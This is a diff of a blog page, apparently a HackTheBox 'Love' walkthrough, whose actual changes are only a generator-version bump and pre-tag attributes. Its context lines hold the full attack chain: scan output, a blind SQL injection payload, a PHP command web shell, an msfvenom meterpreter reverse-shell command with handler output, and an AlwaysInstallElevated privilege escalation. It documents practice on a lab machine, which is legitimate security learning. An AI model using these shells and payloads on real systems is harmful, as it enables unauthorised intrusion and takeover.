@@ -5,7 +5,7 @@
 <meta name=viewport content="width=device-width,initial-scale=1">
 <meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1">
 <meta name=author content="Nasef">
-<meta name=generator content="Hugo 0.87.0">
+<meta name=generator content="Hugo 0.88.1">
 <link rel=stylesheet href=https://iamnasef.com/css/bootstrap.min.css>
 <link rel=stylesheet href=https://iamnasef.com/font-awesome/css/font-awesome.min.css>
 <link href=https://iamnasef.com/scss/style.min.css rel=stylesheet>
@@ -65,7 +65,7 @@ https (443) not responsive but the certificate include a subdomain called stagin
 mysql(4406)
 smb (445)
 and another non responsive http(5000)</p>
-<pre><code>Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-25 23:25 EDT
+<pre tabindex=0><code>Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-25 23:25 EDT
 Nmap scan report for love.htb (10.10.10.239)
 Host is up (0.18s latency).
 Not shown: 993 closed ports
@@ -154,7 +154,7 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 58.95 seconds
 </code></pre><p>I ran another nmap scan -sU for enumerating udp services.</p>
-<pre><code>nmap -sU 10.10.10.239
+<pre tabindex=0><code>nmap -sU 10.10.10.239
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-25 23:25 EDT
 Stats: 0:13:21 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
 UDP Scan Timing: About 76.21% done; ETC: 23:42 (0:04:10 remaining)
@@ -183,7 +183,7 @@ PORT      STATE         SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 1086.41 seconds
 
 </code></pre><p>I ran another nmap scan -p- for enumerating the non-default .</p>
-<pre><code>nmap -p- 10.10.10.239
+<pre tabindex=0><code>nmap -p- 10.10.10.239
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-25 23:25 EDT
 Stats: 0:13:27 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
 SYN Stealth Scan Timing: About 84.83% done; ETC: 23:41 (0:02:24 remaining)
@@ -219,7 +219,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1258.78 seconds
 <h3 id=exploiting-http-service>Exploiting HTTP Service</h3>
 <p>Using the current information I decided to further enumerate the http service that was running on port 80.</p>
 <p>I ran gobuster to enumerate hidden directories, which gave me two directories /admin and /Admin each lead to login page</p>
-<pre><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://love.htb/ -x php,txt,git
+<pre tabindex=0><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://love.htb/ -x php,txt,git
 ===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
@@ -264,7 +264,7 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 
 </code></pre><p><img src=/images/blog/013/1.png alt=image>
 I tried bruteforcing the credintial then tried running sqlmap and found that the login form in /Admin is vulnerable to blind sql injection and was able to retrive admin hash password but couldn&rsquo;t crack it.</p>
-<pre><code>Parameter: username (POST)
+<pre tabindex=0><code>Parameter: username (POST)
 Type: time-based blind
 Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
 Payload: username=test' AND (SELECT 1316 FROM (SELECT(SLEEP(5)))jtCF) AND 'PbfS'='PbfS&amp;password=test&amp;login=
@@ -273,12 +273,12 @@ Payload: username=test' AND (SELECT 1316 FROM (SELECT(SLEEP(5)))jtCF) AND 'PbfS'
 <p>I tried exploring the blocked http service that was running on port 5000 and it gave me a page with admin password !</p>
 <p><img src=/images/blog/013/3.png alt=image></p>
 <p>I used the credintials to login as an admin, and after some search I found file upload vulnerability which I used to upload my both shell.php</p>
-<pre><code>&lt;?php system($_REQUEST['nasef]);?&gt;
+<pre tabindex=0><code>&lt;?php system($_REQUEST['nasef]);?&gt;
 </code></pre><p>and shell.exe that was generated via msfconsole</p>
-<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe
+<pre tabindex=0><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe
 
 </code></pre><p>I activated exploit/multi/handler</p>
-<pre><code>msf6 &gt; use exploit/multi/handler 
+<pre tabindex=0><code>msf6 &gt; use exploit/multi/handler 
 [*] Using configured payload generic/shell_reverse_tcp
 msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
 payload =&gt; windows/meterpreter/reverse_tcp
@@ -292,14 +292,14 @@ msf6 exploit(multi/handler) &gt; exploit
 [*] Sending stage (175174 bytes) to 10.10.10.239
 [*] Meterpreter session 2 opened (10.10.14.7:4444 -&gt; 10.10.10.239:53375) at 2021-06-25 23:32:42 -0400
 </code></pre><p>and activated the msfvenom shell by calling</p>
-<pre><code>http://love.htb/images/shell.php?nasef=shell.exe
+<pre tabindex=0><code>http://love.htb/images/shell.php?nasef=shell.exe
 </code></pre><p>and voila I got user.txt</p>
-<pre><code>C:\Users\Phoebe\Desktop&gt;type user.txt
+<pre tabindex=0><code>C:\Users\Phoebe\Desktop&gt;type user.txt
 type user.txt
 ae927b83b2802f562d38a1be36ef33b0
 </code></pre><h3 id=privilege-escalation>Privilege Escalation</h3>
 <p>Before running any heavy privesc scripts, I prefer going through my manual checklist. I checked for the reg entries of AlwaysInstallElevated And found that they were enabled !</p>
-<pre><code>C:\Users\Phoebe\Desktop&gt;reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+<pre tabindex=0><code>C:\Users\Phoebe\Desktop&gt;reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 
 HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
@@ -313,7 +313,7 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
     AlwaysInstallElevated    REG_DWORD    0x1
 
 </code></pre><p>So I ran the metasploit module AlwaysInstallElevated and got System permessions !</p>
-<pre><code>msf6 exploit(multi/handler) &gt; use exploit/windows/local/always_install_elevated
+<pre tabindex=0><code>msf6 exploit(multi/handler) &gt; use exploit/windows/local/always_install_elevated
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
 msf6 exploit(windows/local/always_install_elevated) &gt; set LHOST tun0
 LHOST =&gt; tun0
